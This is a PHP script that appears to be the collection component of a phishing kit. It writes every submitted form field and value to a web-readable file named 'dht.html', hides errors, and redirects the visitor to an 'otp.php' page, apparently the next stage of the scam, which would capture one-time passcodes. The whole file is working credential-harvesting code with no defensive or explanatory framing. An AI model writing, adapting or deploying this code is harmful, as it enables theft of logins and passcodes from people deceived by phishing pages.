<?php
header('location: otp.php');
error_reporting(0);
$handle = fopen("dht.html","a");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "<br>\r\n");
}
fwrite($handle, "<br>\r\n");
fclose($handle);
exit;
?> 
       